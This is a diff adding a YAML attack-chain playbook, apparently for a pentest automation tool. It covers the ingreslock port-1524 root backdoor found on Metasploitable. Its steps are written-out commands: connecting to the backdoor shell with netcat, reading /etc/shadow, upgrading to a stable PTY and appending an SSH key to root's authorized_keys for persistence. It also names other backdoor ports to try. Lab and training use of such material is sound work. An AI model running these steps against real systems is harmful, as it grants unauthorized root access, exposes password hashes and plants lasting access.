@@ -1,0 +1,62 @@
+chain_id: ingreslock_backdoor_1524
+title: "ingreslock 1524 — pre-installed root shell backdoor (Metasploitable)"
+severity: CRITICAL
+tags: [ingreslock, backdoor, rce, metasploitable]
+
+trigger:
+  any_of:
+    - { kind: "ingreslock_backdoor" }
+    - { service_pattern: "(?i)ingreslock" }
+    - { port_in: [1524] }
+
+description: |
+  Port 1524 (`ingreslock`) is the canonical "I have already been
+  rooted, here is your shell" backdoor port — historically used by
+  worms and intentional teaching boxes (Metasploitable 2). If 1524 is
+  open and you can `nc` to it and land on `id` returning `root`,
+  you're done before you started. Always probe first; many CTF /
+  testing environments have it.
+
+steps:
+  - id: 1
+    title: "Probe — netcat to 1524"
+    command: |
+      nc -nv $VICTIMA 1524
+      # Inside the shell:
+      #   id
+      #   uname -a
+      #   cat /etc/shadow
+
+  - id: 2
+    title: "Confirm with nmap"
+    command: |
+      nmap -p 1524 -sV --script=banner $VICTIMA
+
+  - id: 3
+    title: "If interactive — upgrade to a stable PTY"
+    command: |
+      # In the nc shell:
+      python -c 'import pty; pty.spawn("/bin/bash")'
+      # Or:
+      script /dev/null -c bash
+      # Background it (Ctrl+Z), then on Kali:
+      stty raw -echo; fg
+
+  - id: 4
+    title: "Drop SSH key for persistence"
+    command: |
+      # In the rooted shell:
+      mkdir -p /root/.ssh
+      echo 'ssh-ed25519 AAAA...' >> /root/.ssh/authorized_keys
+      chmod 600 /root/.ssh/authorized_keys
+
+common_errors:
+  - error: "Connection refused"
+    solution: |
+      Port closed or backdoor not present (uncommon in production —
+      this is a deliberately-vulnerable-box marker). Look for other
+      classic backdoors: 4444, 6666, 31337, 12345, 1337.
+
+references:
+  - https://en.wikipedia.org/wiki/Ingres_(database)
+  - https://web.archive.org/web/2010*/metasploitable
